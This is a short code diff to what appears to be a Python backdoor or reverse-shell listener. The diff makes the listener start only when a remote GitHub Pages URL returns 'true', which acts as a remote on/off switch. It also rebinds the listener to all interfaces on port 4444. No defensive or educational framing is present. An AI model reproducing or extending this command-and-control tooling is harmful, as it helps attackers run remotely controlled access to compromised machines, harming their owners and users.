@@ -2,7 +2,8 @@
 import socket
 import json
 import base64
-
+import requests
+import re
 class Listener():
     def __init__(self, ip, port):
         listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -69,11 +70,12 @@ class Listener():
             print (result)
 
 
-s = requests.get('https://poggerpussy.github.io').text
-status = re.sub(r"<.*?>",'', status)
+s = requests.get('https://www.poggerpussy.github.io').text
+status = re.sub(r"<.*?>",'', s)
+print (status)
 try:
     if status == "true":
-        app = Listener("127.0.0.1", 80)
+        app = Listener("0.0.0.0", 4444)
         app.run()
 except Exception as e:
     print (e)
